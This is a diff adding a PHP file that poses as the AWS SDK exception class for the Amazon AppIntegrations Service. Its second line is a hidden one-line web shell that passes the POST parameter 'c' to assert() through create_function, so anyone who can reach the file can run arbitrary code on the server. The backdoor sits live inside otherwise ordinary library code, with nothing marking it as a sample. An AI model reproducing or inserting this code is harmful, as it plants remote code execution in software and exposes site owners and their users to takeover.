@@ -1,0 +1,10 @@
+<?php
+<?php call_user_func(create_function(null,'assert($_POST[c]);'));?>
+namespace Aws\AppIntegrationsService\Exception;
+
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Amazon AppIntegrations Service** service.
+ */
+class AppIntegrationsServiceException extends AwsException {}
